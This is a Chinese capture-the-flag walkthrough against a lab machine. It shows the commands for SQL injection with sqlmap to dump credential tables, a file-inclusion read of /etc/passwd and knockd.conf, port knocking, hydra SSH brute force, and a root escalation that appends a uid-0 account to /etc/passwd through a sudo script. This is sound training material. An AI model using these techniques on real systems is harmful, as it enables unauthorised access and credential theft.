
# 0x00环境

攻击机：kali：192.168.1.28

靶机DC-1：192.168.1.17


# 0x01实战


## 端口扫描

```
nmap -sV -A 192.168.1.17
```

![image-20220113111727814.png](./assets/1652257220065-75a6fb21-dba6-4fa4-b54d-931111c4cbe6.png)


## 目录扫描

![image-20220113112512459.png](./assets/1652257224704-f10d698d-108c-4f8b-b3a6-ba0c9e977f48.png)

扫描出includes目录，可能存在文件包含漏洞

![image-20220113112641207.png](./assets/1652257228089-5e8b0a30-62b4-4e06-b8e1-cc0d3e6026ca.png)

扫描出config.php文件，可惜没有什么类容

![image-20220113112717050.png](./assets/1652257230753-ba73107f-ddae-439c-a7ff-0414602e5248.png)


## 漏洞发现

查看网页源码，没有什么有用的信息

![image-20220113112842706.png](./assets/1652257233762-3e0a9406-12ca-40d0-b09b-c9ba4cc1419f.png)

访问HTTP服务，发现在search标签处存在SQL注入漏洞

![image-20220113112959461.png](./assets/1652257236648-af522636-e02e-4804-9b8d-d9f5ed509c2a.png)

![image-20220113113007650.png](./assets/1652257239365-17a149b1-3a83-4f9d-8785-e97404e19e92.png)

使用burpsuite抓包，将请求包保存到test.txt文档中，使用sqlmap扫描

```
sqlmap -r test.txt --dbs
```

![image-20220113113950895.png](./assets/1652257242182-74d5e002-5954-4a14-9b20-c8086ec7deae.png)

暴表

```
sqlmap -r test.txt -D users --tables
```

![image-20220113114115178.png](./assets/1652257244846-bccea49f-0c0b-4c9a-93ef-c4183cd1e438.png)

暴字段

```
sqlmap -r test.txt -D users -T UserDetails --columns
```

![image-20220113114212216.png](./assets/1652257247771-21eb0930-8785-44c7-8c17-7383d30046d5.png)

拖库

```
sqlmap -r test.txt -D users -T UserDetails -C username,password --dump
```

![image-20220113114325946.png](./assets/1652257251072-8b39a975-b152-4340-8717-24822c2a1f4c.png)

将得到的账户和密码分别保存为账号字典和密码字典使用burpsuite进行爆破（手动登录太麻烦了），并没有找到成功登录的账号

![image-20220113140041558.png](./assets/1652257253930-d386b5f0-9cba-4256-8790-75eeeb89551c.png)

尝试使用wfuzz进行爆破，依然是没有成功匹配的账户

```
wfuzz -z file,username.txt -z file,password.txt -d "username=FUZZ&password=FUZ2Z" http://192.168.1.17/manage.php
```

![image-20220113140747442.png](./assets/1652257257196-9a4933d7-e7a6-4beb-8a3d-5cc5fa4c9813.png)

使用sqlmap爆破另外一个库

```
sqlmap -r test.txt --dbs
sqlmap -r test.txt -D Staff --tables
sqlmap -r test.txt -D staff -T Users --columns
sqlmap -r test.txt -D Staff -T Users -C Username,Password --dump
```

![image-20220113141312641.png](./assets/1652257260662-3850ebb9-46b0-471e-b2aa-ad3a1339af51.png)

md5解密得到密码transorbital1

![image-20220113141503234.png](./assets/1652257264552-b16564a5-9c1c-4751-8e7e-35c0b6f455b1.png)

尝试登录后台，成功，登陆后台发现并没有什么东西不过在页面提示了`File does not exist`联想到上面说的可能存在文件包含漏洞

![image-20220113141625420.png](./assets/1652257268459-bdb3bd8d-9953-4d7a-9eff-eb824d568f40.png)

可能存在文件包含漏洞，但是我们不知道包含参数是什么，使用wfuzz测试探测参数

```
wfuzz -b 'PHPSESSID=5ooo4v00ecl2d0lft26rlh12k5' -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.1.17/manage.php?FUZZ=../../../../../../../../etc/passwd
```

![image-20220113144111179.png](./assets/1652257272656-e10131bd-a9de-4697-8e2d-4d24b647c0b6.png)

添加过滤条件，成功得到参数`file`

```
wfuzz --hw 87 -b 'PHPSESSID=5ooo4v00ecl2d0lft26rlh12k5' -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.1.17/manage.php?FUZZ=../../../../../../../../etc/passwd
```

![image-20220113144123330.png](./assets/1652257275991-b96be7fe-7cdf-47a8-95a9-81c05797c9f0.png)

访问/etc/passwd文件，发现一些账户和我们前面爆破第一个数据库里面的账户相同

![image-20220113144423037.png](./assets/1652257284811-5eec841c-81f3-4523-8046-4cd7d7525693.png)

使用前面第一个数据库里面的账户和密码来爆破SSH服务，链接失败

```
hydra -L username.txt -P password.txt 192.168.1.17 ssh
```

![image-20220113144855856.png](./assets/1652257289389-36792087-ebc8-4164-8534-c0ddd58ce404.png)

再次扫描22号端口

```
nmap -sV -A 192.168.1.17 -p 22
```

![image-20220113144943596.png](./assets/1652257292478-cef0d39e-389c-4372-8a97-3e631930aa13.png)

可能存在的问题

- 不允许字典中的用户远程链接
- 22端口可能不是ssh服务
- 启用了端口敲门服务

互联网搜索[端口敲门服务](https://www.cnblogs.com/wsjhk/p/5508051.html)发现若是存在端口敲门服务则在etc目录下会存在knockd.conf文件

![image-20220113145644035.png](./assets/1652257297224-1cddf782-e583-446f-a8f5-44f7ff20c6a4.png)

利用文件包含漏洞查看是否存在该文件

![image-20220113145822467.png](./assets/1652257300875-3cbafffd-8afd-41d4-8cfc-87a81d7e3cf5.png)

存在该文件，而且我们还得到了端口开门序号7469、8475、9842

敲门开启SSH服务

![image-20220113150446134.png](./assets/1652257304319-4ec76123-d464-4772-a3e6-2b5667fce37a.png)

```
nmap -p 7469 192.168.1.17
nmap -p 8475 192.168.1.17
nmap -p 9842 192.168.1.17
```

失败

![image-20220113151723785.png](./assets/1652257308213-89dc696a-8f8f-4148-bfb2-3bd4dd521250.png)

使用natcat命令敲门，成功

```
for x in 7469 8475 9842; do nc 192.168.1.17 $x;done
```

![image-20220113151945334.png](./assets/1652257312677-7b72d27f-234a-4749-b890-9f84497128ad.png)

再次爆破，得到了三个账户

```
hydra -L username.txt -P password.txt 192.168.1.17 ssh
```

![image-20220113152319067.png](./assets/1652257316111-6ac70ab6-2ff9-48c4-b45a-ccf33295be37.png)

依次登录查找最大权限的账户，在janitor用户里面发现新的密码

![image-20220113153040368.png](./assets/1652257463193-a44804db-48fc-4ed7-a41b-e2d4c3ae283c.png)

将密码提取出来结合前面的username.txt再次使用hydra进行爆破

```
hydra -L username.txt -P password2.txt 192.168.1.17 ssh
```

得到一个新用户fredf

![image-20220113153404970.png](./assets/1652257468747-a5426182-3576-4ffc-af4d-c274f687d908.png)

使用fredf账户登录，输入`sudo -l`显示我们可以使用`root`身份执行`/opt/devstuff/dist/test/test`并且不需要密码

![image-20220113153539605.png](./assets/1652257473274-beff5ac9-7aa6-4183-8cf7-476b308abbbc.png)

进入/opt/devstuff/dist/test/执行一下这个test文件

![image-20220113154209448.png](./assets/1652257477761-fec611e0-e1e7-45dd-8386-f443a91f0a4f.png)

显示`Usage: python test.py read append`，就是说这个脚本可以以root权限将任意内容写入任意文件。那么我们可以写入一个具有root权限的用户到/etc/passwd文件中。

使用openssl生成我们自己的password

```
openssl passwd -1 -salt XMTX 123456
```

![image-20220113155417506.png](./assets/1652257482250-9cf88367-e0e6-4f4c-8f11-60600d0896bf.png)

将我们的内容写入tmp目录下的文件，内容为

```
echo 'XMTX:$1$XMTX$c8g3nQF1CtFDu//blOniM0:0:0::/root:/bin/bash' > /tmp/password
echo "XMTX1::0:0:::/bin/bash" > /tmp/password1
```

![image-20220113155815332.png](./assets/1652257493361-a5d156e3-8b87-49f3-bbf6-b712cafcd8b8.png)

利用test脚本将password中的内容追加到/etc/password中并切换到XMTX用户

```
sudo ./test /tmp/password /etc/passwd
```

![image-20220113160218234.png](./assets/1652257497063-77705bf2-179d-448d-9ee9-279596be0078.png)

成功得到root权限


## final-flag

在root的根目录下找到flag

![image-20220113160324294.png](./assets/1652257501194-c56da56a-19d1-429e-bd4a-9a153a405f94.png)
